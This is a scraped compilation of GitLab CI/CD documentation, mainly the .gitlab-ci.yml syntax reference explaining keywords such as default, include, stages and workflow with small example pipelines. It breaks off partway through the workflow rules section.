---
title: GitLab CI Complete Pipeline Reference
provider: GitLab CI
generated_at: 2025-07-08T13:27:44.940Z
pages_included: 9
---

# GitLab CI Complete Pipeline Reference

This comprehensive guide contains all pipeline, workflow, and build configuration documentation for GitLab CI.

## Table of Contents


1. [CI/CD YAML syntax reference](#section-1)
2. [CI/CD YAML syntax reference](#section-2)
3. [CI/CD pipelines](#section-3)
4. [Pipeline architecture](#section-4)
5. [CI/CD Jobs](#section-5)
6. [GitLab CI/CD variables](#section-6)
7. [Mobile DevOps](#section-7)
8. [GitLab CI/CD examples](#section-8)
9. [Environments](#section-9)


---


## 1. CI/CD YAML syntax reference {#section-1}

*Source: [https://docs.gitlab.com/ee/ci/yaml/](https://docs.gitlab.com/ee/ci/yaml/)*

# CI/CD YAML syntax reference

- Tier: Free, Premium, Ultimate
- Offering: GitLab.com, GitLab Self-Managed, GitLab Dedicated

This document lists the configuration options for the GitLab `.gitlab-ci.yml` file.
This file is where you define the CI/CD jobs that make up your pipeline.

- If you are already familiar with [basic CI/CD concepts](https://docs.gitlab.com/ci/), try creating
your own `.gitlab-ci.yml` file by following a tutorial that demonstrates a [simple](https://docs.gitlab.com/ci/quick_start/)
or [complex](https://docs.gitlab.com/ci/quick_start/tutorial/) pipeline.
- For a collection of examples, see [GitLab CI/CD examples](https://docs.gitlab.com/ci/examples/).
- To view a large `.gitlab-ci.yml` file used in an enterprise, see the
[`.gitlab-ci.yml` file for `gitlab`](https://gitlab.com/gitlab-org/gitlab/-/blob/master/.gitlab-ci.yml).

When you are editing your `.gitlab-ci.yml` file, you can validate it with the
[CI Lint](https://docs.gitlab.com/ci/yaml/lint/) tool.

## Keywords [Permalink](https://docs.gitlab.com/ci/yaml/\#keywords "Permalink")

A GitLab CI/CD pipeline configuration includes:

- [Global keywords](https://docs.gitlab.com/ci/yaml/#global-keywords) that configure pipeline behavior:




| Keyword | Description |
| --- | --- |
| [`default`](https://docs.gitlab.com/ci/yaml/#default) | Custom default values for job keywords. |
| [`include`](https://docs.gitlab.com/ci/yaml/#include) | Import configuration from other YAML files. |
| [`stages`](https://docs.gitlab.com/ci/yaml/#stages) | The names and order of the pipeline stages. |
| [`workflow`](https://docs.gitlab.com/ci/yaml/#workflow) | Control what types of pipeline run. |





|
|

- [Header keywords](https://docs.gitlab.com/ci/yaml/#header-keywords)




| Keyword | Description |
| --- | --- |
| [`spec`](https://docs.gitlab.com/ci/yaml/#spec) | Define specifications for external configuration files. |





|
|

- [Jobs](https://docs.gitlab.com/ci/jobs/) configured with [job keywords](https://docs.gitlab.com/ci/yaml/#job-keywords):




| Keyword | Description |
| --- | --- |
| [`after_script`](https://docs.gitlab.com/ci/yaml/#after_script) | Override a set of commands that are executed after job. |
| [`allow_failure`](https://docs.gitlab.com/ci/yaml/#allow_failure) | Allow job to fail. A failed job does not cause the pipeline to fail. |
| [`artifacts`](https://docs.gitlab.com/ci/yaml/#artifacts) | List of files and directories to attach to a job on success. |
| [`before_script`](https://docs.gitlab.com/ci/yaml/#before_script) | Override a set of commands that are executed before job. |
| [`cache`](https://docs.gitlab.com/ci/yaml/#cache) | List of files that should be cached between subsequent runs. |
| [`coverage`](https://docs.gitlab.com/ci/yaml/#coverage) | Code coverage settings for a given job. |
| [`dast_configuration`](https://docs.gitlab.com/ci/yaml/#dast_configuration) | Use configuration from DAST profiles on a job level. |
| [`dependencies`](https://docs.gitlab.com/ci/yaml/#dependencies) | Restrict which artifacts are passed to a specific job by providing a list of jobs to fetch artifacts from. |
| [`environment`](https://docs.gitlab.com/ci/yaml/#environment) | Name of an environment to which the job deploys. |
| [`extends`](https://docs.gitlab.com/ci/yaml/#extends) | Configuration entries that this job inherits from. |
| [`identity`](https://docs.gitlab.com/ci/yaml/#identity) | Authenticate with third party services using identity federation. |
| [`image`](https://docs.gitlab.com/ci/yaml/#image) | Use Docker images. |
| [`inherit`](https://docs.gitlab.com/ci/yaml/#inherit) | Select which global defaults all jobs inherit. |
| [`interruptible`](https://docs.gitlab.com/ci/yaml/#interruptible) | Defines if a job can be canceled when made redundant by a newer run. |
| [`manual_confirmation`](https://docs.gitlab.com/ci/yaml/#manual_confirmation) | Define a custom confirmation message for a manual job. |
| [`needs`](https://docs.gitlab.com/ci/yaml/#needs) | Execute jobs earlier than the stage ordering. |
| [`pages`](https://docs.gitlab.com/ci/yaml/#pages) | Upload the result of a job to use with GitLab Pages. |
| [`parallel`](https://docs.gitlab.com/ci/yaml/#parallel) | How many instances of a job should be run in parallel. |
| [`release`](https://docs.gitlab.com/ci/yaml/#release) | Instructs the runner to generate a [release](https://docs.gitlab.com/user/project/releases/) object. |
| [`resource_group`](https://docs.gitlab.com/ci/yaml/#resource_group) | Limit job concurrency. |
| [`retry`](https://docs.gitlab.com/ci/yaml/#retry) | When and how many times a job can be auto-retried in case of a failure. |
| [`rules`](https://docs.gitlab.com/ci/yaml/#rules) | List of conditions to evaluate and determine selected attributes of a job, and whether or not it’s created. |
| [`script`](https://docs.gitlab.com/ci/yaml/#script) | Shell script that is executed by a runner. |
| [`run`](https://docs.gitlab.com/ci/yaml/#run) | Run configuration that is executed by a runner. |
| [`secrets`](https://docs.gitlab.com/ci/yaml/#secrets) | The CI/CD secrets the job needs. |
| [`services`](https://docs.gitlab.com/ci/yaml/#services) | Use Docker services images. |
| [`stage`](https://docs.gitlab.com/ci/yaml/#stage) | Defines a job stage. |
| [`tags`](https://docs.gitlab.com/ci/yaml/#tags) | List of tags that are used to select a runner. |
| [`timeout`](https://docs.gitlab.com/ci/yaml/#timeout) | Define a custom job-level timeout that takes precedence over the project-wide setting. |
| [`trigger`](https://docs.gitlab.com/ci/yaml/#trigger) | Defines a downstream pipeline trigger. |
| [`when`](https://docs.gitlab.com/ci/yaml/#when) | When to run job. |





|
|

- [CI/CD variables](https://docs.gitlab.com/ci/yaml/#variables)




| Keyword | Description |
| --- | --- |
| [Default `variables`](https://docs.gitlab.com/ci/yaml/#default-variables) | Define default CI/CD variables for all jobs in the pipeline. |
| [Job `variables`](https://docs.gitlab.com/ci/yaml/#job-variables) | Define CI/CD variables for individual jobs. |





|
|

- [Deprecated keywords](https://docs.gitlab.com/ci/yaml/deprecated_keywords/) that are no longer recommended for use.


## Global keywords [Permalink](https://docs.gitlab.com/ci/yaml/\#global-keywords "Permalink")

Some keywords are not defined in a job. These keywords control pipeline behavior
or import additional pipeline configuration.

### `default` [Permalink](https://docs.gitlab.com/ci/yaml/\#default "Permalink")

History

- Support for `id_tokens` [introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/419750) in GitLab 16.4.

You can set global defaults for some keywords. Each default keyword is copied to every job
that doesn’t already have it defined. If the job already has a keyword defined, that default
is not used.

**Keyword type**: Global keyword.

**Supported values**: These keywords can have custom defaults:

- [`after_script`](https://docs.gitlab.com/ci/yaml/#after_script)
- [`artifacts`](https://docs.gitlab.com/ci/yaml/#artifacts)
- [`before_script`](https://docs.gitlab.com/ci/yaml/#before_script)
- [`cache`](https://docs.gitlab.com/ci/yaml/#cache)
- [`hooks`](https://docs.gitlab.com/ci/yaml/#hooks)
- [`id_tokens`](https://docs.gitlab.com/ci/yaml/#id_tokens)
- [`image`](https://docs.gitlab.com/ci/yaml/#image)
- [`interruptible`](https://docs.gitlab.com/ci/yaml/#interruptible)
- [`retry`](https://docs.gitlab.com/ci/yaml/#retry)
- [`services`](https://docs.gitlab.com/ci/yaml/#services)
- [`tags`](https://docs.gitlab.com/ci/yaml/#tags)
- [`timeout`](https://docs.gitlab.com/ci/yaml/#timeout), though due to [issue 213634](https://gitlab.com/gitlab-org/gitlab/-/issues/213634)
this keyword has no effect.

**Example of `default`**:

YAML Copy to clipboard

```yaml
default:
  image: ruby:3.0
  retry: 2

rspec:
  script: bundle exec rspec

rspec 2.7:
  image: ruby:2.7
  script: bundle exec rspec
```

In this example:

- `image: ruby:3.0` and `retry: 2` are the default keywords for all jobs in the pipeline.
- The `rspec` job does not have `image` or `retry` defined, so it uses the defaults of
`image: ruby:3.0` and `retry: 2`.
- The `rspec 2.7` job does not have `retry` defined, but it does have `image` explicitly defined.
It uses the default `retry: 2`, but ignores the default `image` and uses the `image: ruby:2.7`
defined in the job.

**Additional details**:

- Control inheritance of default keywords in jobs with [`inherit:default`](https://docs.gitlab.com/ci/yaml/#inheritdefault).
- Global defaults are not passed to [downstream pipelines](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/),
which run independently of the upstream pipeline that triggered the downstream pipeline.

### `include` [Permalink](https://docs.gitlab.com/ci/yaml/\#include "Permalink")

Use `include` to include external YAML files in your CI/CD configuration.
You can split one long `.gitlab-ci.yml` file into multiple files to increase readability,
or reduce duplication of the same configuration in multiple places.

You can also store template files in a central repository and include them in projects.

The `include` files are:

- Merged with those in the `.gitlab-ci.yml` file.
- Always evaluated first and then merged with the content of the `.gitlab-ci.yml` file,
regardless of the position of the `include` keyword.

The time limit to resolve all files is 30 seconds.

**Keyword type**: Global keyword.

**Supported values**: The `include` subkeys:

- [`include:component`](https://docs.gitlab.com/ci/yaml/#includecomponent)
- [`include:local`](https://docs.gitlab.com/ci/yaml/#includelocal)
- [`include:project`](https://docs.gitlab.com/ci/yaml/#includeproject)
- [`include:remote`](https://docs.gitlab.com/ci/yaml/#includeremote)
- [`include:template`](https://docs.gitlab.com/ci/yaml/#includetemplate)

And optionally:

- [`include:inputs`](https://docs.gitlab.com/ci/yaml/#includeinputs)
- [`include:rules`](https://docs.gitlab.com/ci/yaml/#includerules)
- [`include:integrity`](https://docs.gitlab.com/ci/yaml/#includeintegrity)

**Additional details**:

- Only [certain CI/CD variables](https://docs.gitlab.com/ci/yaml/includes/#use-variables-with-include) can be used
with `include` keywords.
- Use merging to customize and override included CI/CD configurations with local
- You can override included configuration by having the same job name or global keyword
in the `.gitlab-ci.yml` file. The two configurations are merged together, and the
configuration in the `.gitlab-ci.yml` file takes precedence over the included configuration.
- If you rerun a:
  - Job, the `include` files are not fetched again. All jobs in a pipeline use the configuration
    fetched when the pipeline was created. Any changes to the source `include` files
    do not affect job reruns.
  - Pipeline, the `include` files are fetched again. If they changed after the last
    pipeline run, the new pipeline uses the changed configuration.
- You can have up to 150 includes per pipeline by default, including [nested](https://docs.gitlab.com/ci/yaml/includes/#use-nested-includes). Additionally:
  - In [GitLab 16.0 and later](https://gitlab.com/gitlab-org/gitlab/-/issues/207270) users on GitLab Self-Managed can
    change the [maximum includes](https://docs.gitlab.com/administration/settings/continuous_integration/#set-maximum-includes) value.
  - In [GitLab 15.10 and later](https://gitlab.com/gitlab-org/gitlab/-/issues/367150) you can have up to 150 includes.
    In nested includes, the same file can be included multiple times, but duplicated includes
    count towards the limit.
  - From [GitLab 14.9 to GitLab 15.9](https://gitlab.com/gitlab-org/gitlab/-/issues/28987), you can have up to 100 includes.
    The same file can be included multiple times in nested includes, but duplicates are ignored.

#### `include:component` [Permalink](https://docs.gitlab.com/ci/yaml/\#includecomponent "Permalink")

Use `include:component` to add a [CI/CD component](https://docs.gitlab.com/ci/components/) to the
pipeline configuration.

**Keyword type**: Global keyword.

**Supported values**: The full address of the CI/CD component, formatted as
`<fully-qualified-domain-name>/<project-path>/<component-name>@<specific-version>`.

**Example of `include:component`**:

YAML Copy to clipboard

```yaml
include:
  - component: $CI_SERVER_FQDN/my-org/security-components/secret-detection@1.0
```

**Related topics**:

- [Use a CI/CD component](https://docs.gitlab.com/ci/components/#use-a-component).

#### `include:local` [Permalink](https://docs.gitlab.com/ci/yaml/\#includelocal "Permalink")

Use `include:local` to include a file that is in the same repository and branch as the configuration file containing the `include` keyword.
Use `include:local` instead of symbolic links.

**Keyword type**: Global keyword.

**Supported values**:

A full path relative to the root directory ( `/`):

- The YAML file must have the extension `.yml` or `.yaml`.
- You can [use `*` and `**` wildcards in the file path](https://docs.gitlab.com/ci/yaml/includes/#use-includelocal-with-wildcard-file-paths).
- You can use [certain CI/CD variables](https://docs.gitlab.com/ci/yaml/includes/#use-variables-with-include).

**Example of `include:local`**:

YAML Copy to clipboard

```yaml
include:
  - local: '/templates/.gitlab-ci-template.yml'
```

You can also use shorter syntax to define the path:

YAML Copy to clipboard

```yaml
include: '.gitlab-ci-production.yml'
```

**Additional details**:

- The `.gitlab-ci.yml` file and the local file must be on the same branch.
- You can’t include local files through Git submodules paths.
- `include` configuration is always evaluated based on the location of the file
containing the `include` keyword, not the project running the pipeline. If a
[nested `include`](https://docs.gitlab.com/ci/yaml/includes/#use-nested-includes) is in a configuration file
in a different project, `include: local` checks that other project for the file.

#### `include:project` [Permalink](https://docs.gitlab.com/ci/yaml/\#includeproject "Permalink")

To include files from another private project on the same GitLab instance,
use `include:project` and `include:file`.

**Keyword type**: Global keyword.

**Supported values**:

- `include:project`: The full GitLab project path.
- `include:file` A full file path, or array of file paths, relative to the root directory ( `/`).
The YAML files must have the `.yml` or `.yaml` extension.
- `include:ref`: Optional. The ref to retrieve the file from. Defaults to the `HEAD` of the project
when not specified.
- You can use [certain CI/CD variables](https://docs.gitlab.com/ci/yaml/includes/#use-variables-with-include).

**Example of `include:project`**:

YAML Copy to clipboard

```yaml
include:
  - project: 'my-group/my-project'
    file: '/templates/.gitlab-ci-template.yml'
  - project: 'my-group/my-subgroup/my-project-2'
    file:
      - '/templates/.builds.yml'
      - '/templates/.tests.yml'
```

You can also specify a `ref`:

YAML Copy to clipboard

```yaml
include:
  - project: 'my-group/my-project'
    ref: main                                      # Git branch
    file: '/templates/.gitlab-ci-template.yml'
  - project: 'my-group/my-project'
    ref: v1.0.0                                    # Git Tag
    file: '/templates/.gitlab-ci-template.yml'
  - project: 'my-group/my-project'
    ref: 787123b47f14b552955ca2786bc9542ae66fee5b  # Git SHA
    file: '/templates/.gitlab-ci-template.yml'
```

**Additional details**:

- `include` configuration is always evaluated based on the location of the file
containing the `include` keyword, not the project running the pipeline. If a
[nested `include`](https://docs.gitlab.com/ci/yaml/includes/#use-nested-includes) is in a configuration file
in a different project, `include: local` checks that other project for the file.
- When the pipeline starts, the `.gitlab-ci.yml` file configuration included by all methods is evaluated.
The configuration is a snapshot in time and persists in the database. GitLab does not reflect any changes to
the referenced `.gitlab-ci.yml` file configuration until the next pipeline starts.
- When you include a YAML file from another private project, the user running the pipeline
must be a member of both projects and have the appropriate permissions to run pipelines.
A `not found or access denied` error may be displayed if the user does not have access to any of the included files.
- Be careful when including another project’s CI/CD configuration file. No pipelines or notifications trigger when CI/CD configuration files change.
From a security perspective, this is similar to pulling a third-party dependency. For the `ref`, consider:
  - Using a specific SHA hash, which should be the most stable option. Use the
    full 40-character SHA hash to ensure the desired commit is referenced, because
    using a short SHA hash for the `ref` might be ambiguous.
  - Applying both [protected branch](https://docs.gitlab.com/user/project/repository/branches/protected/) and [protected tag](https://docs.gitlab.com/user/project/protected_tags/#prevent-tag-creation-with-the-same-name-as-branches) rules to
    the `ref` in the other project. Protected tags and branches are more likely to pass through change management before changing.

#### `include:remote` [Permalink](https://docs.gitlab.com/ci/yaml/\#includeremote "Permalink")

Use `include:remote` with a full URL to include a file from a different location.

**Keyword type**: Global keyword.

**Supported values**:

A public URL accessible by an HTTP/HTTPS `GET` request:

- Authentication with the remote URL is not supported.
- The YAML file must have the extension `.yml` or `.yaml`.
- You can use [certain CI/CD variables](https://docs.gitlab.com/ci/yaml/includes/#use-variables-with-include).

**Example of `include:remote`**:

YAML Copy to clipboard

```yaml
include:
  - remote: 'https://gitlab.com/example-project/-/raw/main/.gitlab-ci.yml'
```

**Additional details**:

- All [nested includes](https://docs.gitlab.com/ci/yaml/includes/#use-nested-includes) are executed without context as a public user,
so you can only include public projects or templates. No variables are available in the `include` section of nested includes.
- Be careful when including another project’s CI/CD configuration file. No pipelines or notifications trigger
when the other project’s files change. From a security perspective, this is similar to
pulling a third-party dependency. To verify the integrity of the included file, consider using the [`integrity`](https://docs.gitlab.com/ci/yaml/#includeintegrity) keyword.
If you link to another GitLab project you own, consider the use of both
[protected branches](https://docs.gitlab.com/user/project/repository/branches/protected/) and [protected tags](https://docs.gitlab.com/user/project/protected_tags/#prevent-tag-creation-with-the-same-name-as-branches)
to enforce change management rules.

#### `include:template` [Permalink](https://docs.gitlab.com/ci/yaml/\#includetemplate "Permalink")

Use `include:template` to include [`.gitlab-ci.yml` templates](https://gitlab.com/gitlab-org/gitlab/-/tree/master/lib/gitlab/ci/templates).

**Keyword type**: Global keyword.

**Supported values**:

A [CI/CD template](https://docs.gitlab.com/ci/examples/#cicd-templates):

- All templates can be viewed in [`lib/gitlab/ci/templates`](https://gitlab.com/gitlab-org/gitlab/-/tree/master/lib/gitlab/ci/templates).
Not all templates are designed to be used with `include:template`, so check template
comments before using one.
- You can use [certain CI/CD variables](https://docs.gitlab.com/ci/yaml/includes/#use-variables-with-include).

**Example of `include:template`**:

YAML Copy to clipboard

```yaml
# File sourced from the GitLab template collection
include:
  - template: Auto-DevOps.gitlab-ci.yml
```

Multiple `include:template` files:

YAML Copy to clipboard

```yaml
include:
  - template: Android-Fastlane.gitlab-ci.yml
  - template: Auto-DevOps.gitlab-ci.yml
```

**Additional details**:

- All [nested includes](https://docs.gitlab.com/ci/yaml/includes/#use-nested-includes) are executed without context as a public user,
so you can only include public projects or templates. No variables are available in the `include` section of nested includes.

#### `include:inputs` [Permalink](https://docs.gitlab.com/ci/yaml/\#includeinputs "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/391331) in GitLab 15.11 as a beta feature.
- [Made generally available](https://gitlab.com/gitlab-com/www-gitlab-com/-/merge_requests/134062) in GitLab 17.0.

Use `include:inputs` to set the values for input parameters when the included configuration
uses [`spec:inputs`](https://docs.gitlab.com/ci/yaml/#specinputs) and is added to the pipeline.

**Keyword type**: Global keyword.

**Supported values**: A string, numeric value, or boolean.

**Example of `include:inputs`**:

YAML Copy to clipboard

```yaml
include:
  - local: 'custom_configuration.yml'
    inputs:
      website: "My website"
```

In this example:

- The configuration contained in `custom_configuration.yml` is added to the pipeline,
with a `website` input set to a value of `My website` for the included configuration.

**Additional details**:

- If the included configuration file uses [`spec:inputs:type`](https://docs.gitlab.com/ci/yaml/#specinputstype),
the input value must match the defined type.
- If the included configuration file uses [`spec:inputs:options`](https://docs.gitlab.com/ci/yaml/#specinputsoptions),
the input value must match one of the listed options.

**Related topics**:

- [Set input values when using `include`](https://docs.gitlab.com/ci/inputs/#for-configuration-added-with-include).

#### `include:rules` [Permalink](https://docs.gitlab.com/ci/yaml/\#includerules "Permalink")

You can use [`rules`](https://docs.gitlab.com/ci/yaml/#rules) with `include` to conditionally include other configuration files.

**Keyword type**: Global keyword.

**Supported values**: These `rules` subkeys:

- [`rules:if`](https://docs.gitlab.com/ci/yaml/#rulesif).
- [`rules:exists`](https://docs.gitlab.com/ci/yaml/#rulesexists).
- [`rules:changes`](https://docs.gitlab.com/ci/yaml/#ruleschanges).

Some [CI/CD variables are supported](https://docs.gitlab.com/ci/yaml/includes/#use-variables-with-include).

**Example of `include:rules`**:

YAML Copy to clipboard

```yaml
include:
  - local: build_jobs.yml
    rules:
      - if: $INCLUDE_BUILDS == "true"

test-job:
  stage: test
  script: echo "This is a test job"
```

In this example, if the `INCLUDE_BUILDS` variable is:

- `true`, the `build_jobs.yml` configuration is included in the pipeline.
- Not `true` or does not exist, the `build_jobs.yml` configuration is not included in the pipeline.

**Related topics**:

- Examples of using `include` with:
  - [`rules:if`](https://docs.gitlab.com/ci/yaml/includes/#include-with-rulesif).
  - [`rules:changes`](https://docs.gitlab.com/ci/yaml/includes/#include-with-ruleschanges).
  - [`rules:exists`](https://docs.gitlab.com/ci/yaml/includes/#include-with-rulesexists).

#### `include:integrity` [Permalink](https://docs.gitlab.com/ci/yaml/\#includeintegrity "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/178593) in GitLab 17.9.

Use `integrity` with `include:remote` to specifiy a SHA256 hash of the included remote file.
If `integrity` does not match the actual content, the remote file is not processed
and the pipeline fails.

**Keyword type**: Global keyword.

**Supported values**: Base64-encoded SHA256 hash of the included content.

**Example of `include:integrity`**:

YAML Copy to clipboard

```yaml
include:
  - remote: 'https://gitlab.com/example-project/-/raw/main/.gitlab-ci.yml'
    integrity: 'sha256-L3/GAoKaw0Arw6hDCKeKQlV1QPEgHYxGBHsH4zG1IY8='
```

### `stages` [Permalink](https://docs.gitlab.com/ci/yaml/\#stages "Permalink")

History

- Support for nested array of strings [introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/439451) in GitLab 16.9.

Use `stages` to define stages that contain groups of jobs. Use [`stage`](https://docs.gitlab.com/ci/yaml/#stage)
in a job to configure the job to run in a specific stage.

If `stages` is not defined in the `.gitlab-ci.yml` file, the default pipeline stages are:

- [`.pre`](https://docs.gitlab.com/ci/yaml/#stage-pre)
- `build`
- `test`
- `deploy`
- [`.post`](https://docs.gitlab.com/ci/yaml/#stage-post)

The order of the items in `stages` defines the execution order for jobs:

- Jobs in the same stage run in parallel.
- Jobs in the next stage run after the jobs from the previous stage complete successfully.

If a pipeline contains only jobs in the `.pre` or `.post` stages, it does not run.
There must be at least one other job in a different stage.

**Keyword type**: Global keyword.

**Example of `stages`**:

YAML Copy to clipboard

```yaml
stages:
  - build
  - test
  - deploy
```

In this example:

1. All jobs in `build` execute in parallel.
2. If all jobs in `build` succeed, the `test` jobs execute in parallel.
3. If all jobs in `test` succeed, the `deploy` jobs execute in parallel.
4. If all jobs in `deploy` succeed, the pipeline is marked as `passed`.

If any job fails, the pipeline is marked as `failed` and jobs in later stages do not
start. Jobs in the current stage are not stopped and continue to run.

**Additional details**:

- If a job does not specify a [`stage`](https://docs.gitlab.com/ci/yaml/#stage), the job is assigned the `test` stage.
- If a stage is defined but no jobs use it, the stage is not visible in the pipeline,
which can help [compliance pipeline configurations](https://docs.gitlab.com/user/compliance/compliance_pipelines/):
  - Stages can be defined in the compliance configuration but remain hidden if not used.
  - The defined stages become visible when developers use them in job definitions.

**Related topics**:

- To make a job start earlier and ignore the stage order, use the [`needs`](https://docs.gitlab.com/ci/yaml/#needs) keyword.

### `workflow` [Permalink](https://docs.gitlab.com/ci/yaml/\#workflow "Permalink")

Use [`workflow`](https://docs.gitlab.com/ci/yaml/workflow/) to control pipeline behavior.

You can use some [predefined CI/CD variables](https://docs.gitlab.com/ci/variables/predefined_variables/) in
`workflow` configuration, but not variables that are only defined when jobs start.

**Related topics**:

- [`workflow: rules` examples](https://docs.gitlab.com/ci/yaml/workflow/#workflow-rules-examples)
- [Switch between branch pipelines and merge request pipelines](https://docs.gitlab.com/ci/yaml/workflow/#switch-between-branch-pipelines-and-merge-request-pipelines)

#### `workflow:auto_cancel:on_new_commit` [Permalink](https://docs.gitlab.com/ci/yaml/\#workflowauto_cancelon_new_commit "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/412473) in GitLab 16.8 [with a flag](https://docs.gitlab.com/administration/feature_flags/) named `ci_workflow_auto_cancel_on_new_commit`. Disabled by default.
- [Enabled on GitLab.com and GitLab Self-Managed](https://gitlab.com/gitlab-org/gitlab/-/issues/434676) in GitLab 16.9.
- [Generally available](https://gitlab.com/gitlab-org/gitlab/-/issues/434676) in GitLab 16.10. Feature flag `ci_workflow_auto_cancel_on_new_commit` removed.

Use `workflow:auto_cancel:on_new_commit` to configure the behavior of
the [auto-cancel redundant pipelines](https://docs.gitlab.com/ci/pipelines/settings/#auto-cancel-redundant-pipelines) feature.

**Supported values**:

- `conservative`: Cancel the pipeline, but only if no jobs with `interruptible: false` have started yet. Default when not defined.
- `interruptible`: Cancel only jobs with `interruptible: true`.
- `none`: Do not auto-cancel any jobs.

**Example of `workflow:auto_cancel:on_new_commit`**:

YAML Copy to clipboard

```yaml
workflow:
  auto_cancel:
    on_new_commit: interruptible

job1:
  interruptible: true
  script: sleep 60

job2:
  interruptible: false  # Default when not defined.
  script: sleep 60
```

In this example:

- When a new commit is pushed to a branch, GitLab creates a new pipeline and `job1` and `job2` start.
- If a new commit is pushed to the branch before the jobs complete, only `job1` is canceled.

#### `workflow:auto_cancel:on_job_failure` [Permalink](https://docs.gitlab.com/ci/yaml/\#workflowauto_cancelon_job_failure "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/23605) in GitLab 16.10 [with a flag](https://docs.gitlab.com/administration/feature_flags/) named `auto_cancel_pipeline_on_job_failure`. Disabled by default.
- [Generally available](https://gitlab.com/gitlab-org/gitlab/-/issues/433163) in GitLab 16.11. Feature flag `auto_cancel_pipeline_on_job_failure` removed.

Use `workflow:auto_cancel:on_job_failure` to configure which jobs should be canceled as soon as one job fails.

**Supported values**:

- `all`: Cancel the pipeline and all running jobs as soon as one job fails.
- `none`: Do not auto-cancel any jobs.

**Example of `workflow:auto_cancel:on_job_failure`**:

YAML Copy to clipboard

```yaml
stages: [stage_a, stage_b]

workflow:
  auto_cancel:
    on_job_failure: all

job1:
  stage: stage_a
  script: sleep 60

job2:
  stage: stage_a
  script:
    - sleep 30
    - exit 1

job3:
  stage: stage_b
  script:
    - sleep 30
```

In this example, if `job2` fails, `job1` is canceled if it is still running and `job3` does not start.

**Related topics**:

- [Auto-cancel the parent pipeline from a downstream pipeline](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#auto-cancel-the-parent-pipeline-from-a-downstream-pipeline)

#### `workflow:name` [Permalink](https://docs.gitlab.com/ci/yaml/\#workflowname "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/372538) in GitLab 15.5 [with a flag](https://docs.gitlab.com/administration/feature_flags/) named `pipeline_name`. Disabled by default.
- [Enabled on GitLab.com and GitLab Self-Managed](https://gitlab.com/gitlab-org/gitlab/-/issues/376095) in GitLab 15.7.
- [Generally available](https://gitlab.com/gitlab-org/gitlab/-/issues/376095) in GitLab 15.8. Feature flag `pipeline_name` removed.

You can use `name` in `workflow:` to define a name for pipelines.

All pipelines are assigned the defined name. Any leading or trailing spaces in the name are removed.

**Supported values**:

- A string.
- [CI/CD variables](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file).
- A combination of both.

**Examples of `workflow:name`**:

A simple pipeline name with a predefined variable:

YAML Copy to clipboard

```yaml
workflow:
  name: 'Pipeline for branch: $CI_COMMIT_BRANCH'
```

A configuration with different pipeline names depending on the pipeline conditions:

YAML Copy to clipboard

```yaml
variables:
  PROJECT1_PIPELINE_NAME: 'Default pipeline name'  # A default is not required

workflow:
  name: '$PROJECT1_PIPELINE_NAME'
  rules:
    - if: '$CI_MERGE_REQUEST_LABELS =~ /pipeline:run-in-ruby3/'
      variables:
        PROJECT1_PIPELINE_NAME: 'Ruby 3 pipeline'
    - if: '$CI_PIPELINE_SOURCE == "merge_request_event"'
      variables:
        PROJECT1_PIPELINE_NAME: 'MR pipeline: $CI_MERGE_REQUEST_SOURCE_BRANCH_NAME'
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH  # For default branch pipelines, use the default name
```

**Additional details**:

- If the name is an empty string, the pipeline is not assigned a name. A name consisting
of only CI/CD variables could evaluate to an empty string if all the variables are also empty.
- `workflow:rules:variables` become [default variables](https://docs.gitlab.com/ci/yaml/#default-variables) available in all jobs,
including [`trigger`](https://docs.gitlab.com/ci/yaml/#trigger) jobs which forward variables to downstream pipelines by default.
If the downstream pipeline uses the same variable, the [variable is overwritten](https://docs.gitlab.com/ci/variables/#cicd-variable-precedence)
by the upstream variable value. Be sure to either:
  - Use a unique variable name in every project’s pipeline configuration, like `PROJECT1_PIPELINE_NAME`.
  - Use [`inherit:variables`](https://docs.gitlab.com/ci/yaml/#inheritvariables) in the trigger job and list the
    exact variables you want to forward to the downstream pipeline.

#### `workflow:rules` [Permalink](https://docs.gitlab.com/ci/yaml/\#workflowrules "Permalink")

The `rules` keyword in `workflow` is similar to [`rules` defined in jobs](https://docs.gitlab.com/ci/yaml/#rules),
but controls whether or not a whole pipeline is created.

When no rules evaluate to true, the pipeline does not run.

**Supported values**: You can use some of the same keywords as job-level [`rules`](https://docs.gitlab.com/ci/yaml/#rules):

- [`rules: if`](https://docs.gitlab.com/ci/yaml/#rulesif).
- [`rules: changes`](https://docs.gitlab.com/ci/yaml/#ruleschanges).
- [`rules: exists`](https://docs.gitlab.com/ci/yaml/#rulesexists).
- [`when`](https://docs.gitlab.com/ci/yaml/#when), can only be `always` or `never` when used with `workflow`.
- [`variables`](https://docs.gitlab.com/ci/yaml/#workflowrulesvariables).

**Example of `workflow:rules`**:

YAML Copy to clipboard

```yaml
workflow:
  rules:
    - if: $CI_COMMIT_TITLE =~ /-draft$/
      when: never
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
```

In this example, pipelines run if the commit title (first line of the commit message) does not end with `-draft`
and the pipeline is for either:

- A merge request
- The default branch.

**Additional details**:

- If your rules match both branch pipelines (other than the default branch) and merge request pipelines,
[duplicate pipelines](https://docs.gitlab.com/ci/jobs/job_rules/#avoid-duplicate-pipelines) can occur.
- `start_in`, `allow_failure`, and `needs` are not supported in `workflow:rules`,
but do not cause a syntax violation. Though they have no effect, do not use them
in `workflow:rules` as it could cause syntax failures in the future. See
[issue 436473](https://gitlab.com/gitlab-org/gitlab/-/issues/436473) for more details.

**Related topics**:

- [Common `if` clauses for `workflow:rules`](https://docs.gitlab.com/ci/yaml/workflow/#common-if-clauses-for-workflowrules).
- [Use `rules` to run merge request pipelines](https://docs.gitlab.com/ci/pipelines/merge_request_pipelines/#add-jobs-to-merge-request-pipelines).

#### `workflow:rules:variables` [Permalink](https://docs.gitlab.com/ci/yaml/\#workflowrulesvariables "Permalink")

